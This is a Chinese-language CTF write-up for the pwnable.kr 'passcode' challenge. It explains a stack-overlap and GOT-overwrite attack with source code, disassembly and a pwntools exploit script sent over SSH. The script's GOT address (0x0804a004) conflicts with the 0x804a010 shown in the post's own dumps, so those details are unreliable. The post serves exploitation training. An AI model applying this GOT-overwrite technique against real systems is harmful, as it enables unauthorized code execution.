---
layout: post
title: pwnable.kr - GOT overwrite
slug: pwnable.kr - GOT overwrite
category: PWN
published: true
---

这是一道pwnable.kr上的题：

```bash
ssh passcode@pwnable.kr -p2222 (pw:guest)
```

进入之后可以查看题目的源码：

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
 int passcode1;
 int passcode2;

 printf("enter passcode1 : ");
 scanf("%d", passcode1);
 fflush(stdin);

 // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
 printf("enter passcode2 : ");
        scanf("%d", passcode2);

 printf("checking...\n");
 if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
  exit(0);
        }
}

void welcome(){
 char name[100];
 printf("enter you name : ");
 scanf("%100s", name);
 printf("Welcome %s!\n", name);
}

int main(){
 printf("Toddler's Secure Login System 1.0 beta.\n");

 welcome();
 login();

 // something after login...
 printf("Now I can safely trust you that you have credential :)\n");
 return 0;
}
```

阅读源码发现，只有你输入的两个密码和源码中相等才能通过，然后调用`system("/bin/cat flag")`拿到flag，但是源码里的`scanf`第二个参数不是变量地址，而是变量，所以无法通过正常手段获取。

可以看到`login`函数中有两个未初始化变量，并且该函数在welcome之后执行。
经过gdb调试发现，`login`的第一个变量`passcode1`在`ebp-0x10`的位置，而`welcome`中的`name`在`ebp-0x70`的位置，这两个变量之间的距离为96，而`name`的缓冲区为100，所以`name`中的最后4个字节是可以覆盖掉`passcode1`的值的。

既然可以覆盖`passcode1`的值，而且`login`函数中又有`scanf`可以向`passcode1`的地址里写值，并且这个二进制是 Partial RELRO的，也就是GOT可写，再有就是`fflush`就在scanf之后执行，那么我们就可以考虑GOT overwrite了。

#### GOT(Global Offset Table)和PLT(Produce linkage Table)

在二进制文件中存在一些动态库的引用（类似于printf\scanf这些从libc.so的引用），这些引用在第一次调用时会去解析。二进制文件中存着一张plt表，这张表是一个数组，保存了所有外部引用函数的一个间接跳转地址。call一个外部函数这个步骤实际会被编译成 call 该函数在plt的地址。

在进入plt表后，第一条指令便是跳转到相应的GOT位置。GOT在数据段，保存的是该二进制引用的全局数据的偏移量，包括全局函数，其结构也是数组。前三项是固定的，包含了动态链接器解析函数地址时候的信息。而GOT又会将指令指向PLT的第二条指令，此时PLT的指令是`push index`，它将该函数在GOT的全局偏移量（这里的`index`）压入栈，然后又跳到PLT的第一个表项。PLT的第一个表项是一个例外，它是一条跳转到动态链接器中的指令，然后又将GOT[1]压入栈，最后调用GOT[2]中的动态链接器函数，该函数使用栈上的两个参数来完成解析。并且，将实际地址写入该函数对应的GOT表项中，之后调用就不再需要动态链接器解析了。

通过objdump -R passcode可以看到`fflush`函数在GOT的位置

```bash
clot@ubuntu:~/CTF/passcode$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a040 R_386_COPY        stdin@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   fflush@GLIBC_2.0
...
```

或者通过gdb来看

```bash
pwndbg> disas login
Dump of assembler code for function login:
   0x0804859b <+0>: push   ebp
   0x0804859c <+1>: mov    ebp,esp
   0x0804859e <+3>: sub    esp,0x18
   0x080485a1 <+6>: sub    esp,0xc
   0x080485a4 <+9>: push   0x8048780
   0x080485a9 <+14>: call   0x8048410 <printf@plt>
   0x080485ae <+19>: add    esp,0x10
   0x080485b1 <+22>: sub    esp,0x8
   0x080485b4 <+25>: push   DWORD PTR [ebp-0x10]
   0x080485b7 <+28>: push   0x8048793
   0x080485bc <+33>: call   0x8048480 <__isoc99_scanf@plt>
   0x080485c1 <+38>: add    esp,0x10
   0x080485c4 <+41>: mov    eax,ds:0x804a040
   0x080485c9 <+46>: sub    esp,0xc
   0x080485cc <+49>: push   eax
   0x080485cd <+50>: call   0x8048420 <fflush@plt>    # <-
   0x080485d2 <+55>: add    esp,0x10
   0x080485d5 <+58>: sub    esp,0xc
   0x080485d8 <+61>: push   0x8048796
   
pwndbg> disas 0x8048420
Dump of assembler code for function fflush@plt:
   0x08048420 <+0>: jmp    DWORD PTR ds:0x804a010   # <-
   0x08048426 <+6>: push   0x8
   0x0804842b <+11>: jmp    0x8048400
End of assembler dump.

```

都是地址`0x804a010`，这个就是在GOT表中的地址，如果重写它，将它改为调用system函数的地址，这样`fflush`函数从plt表跳转到GOT表时，就调用了`system`函数了，即可获得flag。

#### Exploit

```python
#!/usr/bin/python3
from pwn import *

fflushGOTAddress = '\x04\xa0\x04\x08'
systemCall = 0x080485d7
payload = "a" * 96 
payload += fflushGOTAddress
payload += str(int(systemCall))

r = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
p = r.process(executable='./passcode', argv=["./passcode"])

print(p.recvline(1024, timeout=2.0))
p.sendline(payload)
print(p.recvall(timeout=1.0))
p.close()

```

#### Reference

《深入理解计算机系统》

《Linux二进制分析》
